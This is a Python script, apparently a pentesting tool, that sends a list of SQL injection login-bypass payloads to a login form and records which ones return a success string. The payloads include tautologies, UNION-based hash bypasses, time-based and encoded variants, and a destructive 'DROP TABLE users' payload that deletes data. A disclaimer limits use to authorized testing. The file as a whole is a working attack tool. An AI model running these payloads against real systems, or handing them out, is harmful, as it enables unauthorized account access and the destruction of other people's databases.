"""
Bypass SQL Injection Scanner (Advanced Version)

This script is designed to test advanced SQL injection bypass techniques against login forms or vulnerable endpoints.
It includes support for common logic-based payloads, hash-based bypasses, obfuscation, and supports both GET and POST methods.

🚨 Disclaimer: This tool is intended for educational and ethical penetration testing purposes only.
Use only on systems you own or have explicit written authorization to test.

Author: Bar Cohen
"""

import requests

# Load payloads (extendable)
bypass_payloads = [
    # Basic login bypasses
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "'admin' --",
    "' OR '1'='1'; --",
    "'; DROP TABLE users; --",

    # Union/hash-based bypasses
    "' AND 1=0 UNION SELECT 'admin', 'fe1ff105bf807478a217ad4e378dc658'",
    "' AND 1=0 UNION ALL SELECT 'admin', md5('Pass1234.')#",
    "' AND 1=0 UNION SELECT 'admin', sha1('Pass1234')",
    "' AND 1=0 UNION ALL SELECT 'admin', md5('Pass1234')#",
    "'admin' AND '1'='1",

    # Time-based
    "' OR SLEEP(5)#",
    "' OR 1=1 LIMIT 1 OFFSET 1 --",

    # Encoded / obfuscated
    "0x27 OR 0x31=0x31 --",
    "%27%20OR%201%3D1--",
    "' /*!UNION*/ /*!SELECT*/ 1,2 --",

    # Case variation bypasses
    "' oR '1'='1",
    "' Or '1'='1",

    # Injection mimic
    "' + 'a'='a"
]


def test_login_bypass(url, method="POST", username_param="username", password_param="password", success_indicator="Welcome"):
    for payload in bypass_payloads:
        data = {
            username_param: payload,
            password_param: "test"
        }
        try:
            print(f"[>] Testing payload: {payload}")
            if method.upper() == "POST":
                res = requests.post(url, data=data, timeout=5)
            else:
                res = requests.get(url, params=data, timeout=5)

            if success_indicator.lower() in res.text.lower():
                print(f"[!] Potential bypass success with: {payload}\n")
                with open("bypass_results.txt", "a") as f:
                    f.write(f"Success: {payload}\n")
            else:
                print("[-] No success with this payload.\n")
        except Exception as e:
            print(f"[ERROR] Failed test with payload {payload}: {e}\n")


# Example usage
if __name__ == "__main__":
    target_url = "http://example.com/login"  # Replace with your actual testing URL
    test_login_bypass(target_url, method="POST", success_indicator="Welcome")
